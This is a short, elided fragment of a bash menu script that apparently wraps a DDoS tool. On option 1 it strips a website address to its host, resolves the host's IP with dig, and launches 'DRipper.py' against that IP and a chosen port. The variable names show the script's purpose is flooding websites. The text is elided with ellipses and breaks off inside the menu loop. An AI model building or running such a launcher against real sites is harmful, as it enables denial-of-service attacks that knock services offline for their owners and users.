...
while true; do
	...
	if [ "$ANSWER" -eq 1 ]; then
		...
		DDOS_WEBSITE=$(echo "$DDOS_WEBSITE" | sed -e 's|http[s]*://||' -e 's|/.*||')
		DDOS_WEBSITE_IP=$(dig +short "$DDOS_WEBSITE" | head -1)
		python3 DRipper.py -s "$DDOS_WEBSITE_IP" -p "$DDOS_WEBSITE_PORT"
		echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
